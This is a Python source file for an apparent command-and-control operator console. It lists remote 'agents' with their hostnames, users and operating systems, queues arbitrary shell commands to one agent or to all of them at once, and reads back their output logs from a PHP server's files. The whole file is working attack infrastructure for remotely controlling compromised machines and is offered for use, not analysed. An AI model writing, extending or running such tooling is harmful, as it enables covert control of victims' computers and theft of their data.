"""
C2 Manager — Simple terminal commands. No menus, no bullshit.

Usage:
    python c2.py agents                       — List all agents
    python c2.py cmd <agent_id> <command>     — Send command to agent
    python c2.py cmd all <command>            — Send command to ALL agents
    python c2.py logs <agent_id>              — View agent output
    python c2.py logs <agent_id> -n 5         — View last 5 entries
    python c2.py clear <agent_id>             — Clear pending command for agent

All operations are local file operations on the C2 server.
Run this on the same machine as the server/ PHP files.
"""

import sys
import os
import json
import time

# Path to the server directory (adjust if needed)
SERVER_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "server")
COMMANDS_DIR = os.path.join(SERVER_DIR, "commands")
LOGS_DIR = os.path.join(SERVER_DIR, "logs")
AGENTS_FILE = os.path.join(SERVER_DIR, "agents.json")


def ensure_dirs():
    os.makedirs(COMMANDS_DIR, exist_ok=True)
    os.makedirs(LOGS_DIR, exist_ok=True)


def list_agents():
    if not os.path.exists(AGENTS_FILE):
        print("No agents yet.")
        return

    with open(AGENTS_FILE, "r") as f:
        agents = json.load(f)

    if not agents:
        print("No agents yet.")
        return

    print(f"\n {'ID':<14} {'Host':<16} {'User':<12} {'OS':<28} {'Last Seen'}")
    print(" " + "-" * 90)
    for aid, info in agents.items():
        print(f" {aid:<14} {info.get('hostname','?'):<16} {info.get('username','?'):<12} "
              f"{info.get('os','?'):<28} {info.get('last_seen','?')}")
    print()


def send_command(agent_id, command):
    ensure_dirs()

    if agent_id == "all":
        # Send to all registered agents
        if not os.path.exists(AGENTS_FILE):
            print("No agents registered.")
            return
        with open(AGENTS_FILE, "r") as f:
            agents = json.load(f)
        for aid in agents:
            _queue_command(aid, command)
        print(f"Queued for {len(agents)} agents: {command}")
    else:
        _queue_command(agent_id, command)
        print(f"Queued for {agent_id}: {command}")


def _queue_command(agent_id, command):
    cmd_file = os.path.join(COMMANDS_DIR, f"{agent_id}.json")
    data = {
        "command": command,
        "task_id": f"t_{int(time.time())}",
        "queued_at": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    with open(cmd_file, "w") as f:
        json.dump(data, f)


def view_logs(agent_id, count=20):
    log_file = os.path.join(LOGS_DIR, f"agent_{agent_id}.txt")

    if not os.path.exists(log_file):
        print(f"No logs for {agent_id}")
        return

    with open(log_file, "r") as f:
        lines = f.readlines()

    entries = lines[-count:]
    for line in entries:
        try:
            entry = json.loads(line.strip())
            ts = entry.get("received", "?")
            tid = entry.get("task_id", "?")
            out = entry.get("output", "")
            print(f"\n[{ts}] task:{tid}")
            print(out)
        except json.JSONDecodeError:
            print(line.strip())
    print()


def clear_command(agent_id):
    cmd_file = os.path.join(COMMANDS_DIR, f"{agent_id}.json")
    if os.path.exists(cmd_file):
        os.remove(cmd_file)
        print(f"Cleared command for {agent_id}")
    else:
        print(f"No pending command for {agent_id}")


def usage():
    print("""
Usage:
    python c2.py agents                       List all agents
    python c2.py cmd <agent_id> <command>     Send command to agent
    python c2.py cmd all <command>            Send command to ALL agents
    python c2.py logs <agent_id>              View agent output
    python c2.py logs <agent_id> -n 5         View last N entries
    python c2.py clear <agent_id>             Clear pending command
""")


if __name__ == "__main__":
    args = sys.argv[1:]

    if not args:
        usage()
        sys.exit(0)

    action = args[0]

    if action == "agents":
        list_agents()

    elif action == "cmd" and len(args) >= 3:
        agent_id = args[1]
        command = " ".join(args[2:])
        send_command(agent_id, command)

    elif action == "logs" and len(args) >= 2:
        agent_id = args[1]
        count = 20
        if "-n" in args:
            idx = args.index("-n")
            if idx + 1 < len(args):
                count = int(args[idx + 1])
        view_logs(agent_id, count)

    elif action == "clear" and len(args) >= 2:
        clear_command(args[1])

    else:
        usage()
